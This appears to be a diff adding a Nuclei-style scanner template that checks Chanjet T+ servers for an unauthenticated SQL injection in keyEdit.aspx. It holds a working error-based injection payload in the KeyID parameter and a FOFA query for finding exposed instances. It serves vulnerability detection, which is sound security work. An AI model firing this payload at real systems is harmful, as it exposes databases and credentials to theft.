@@ -1,0 +1,26 @@
+http:
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - 转换成数据类型 int 时失败
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /tplus/UFAQD/keyEdit.aspx?KeyID=1%27%20and%201=(select%20@@version)%20--&preload=1 HTTP/1.1
+          Host: {{Hostname}}
+id: changjietong-keyEdit-sql
+info:
+    author: Superhero
+    description: |-
+        fofa: app="畅捷通-TPlus"
+        由于畅捷通T+的keyEdit.aspx接口处未对用户的输入进行过滤和校验，未经身份验证的攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+    name: 畅捷通T+ keyEdit.aspx SQL漏洞
+    reference:
+        - https://blog.csdn.net/m0_60571842/article/details/139899808
+    severity: high
+    tags:
+        - 畅捷通-TPlus
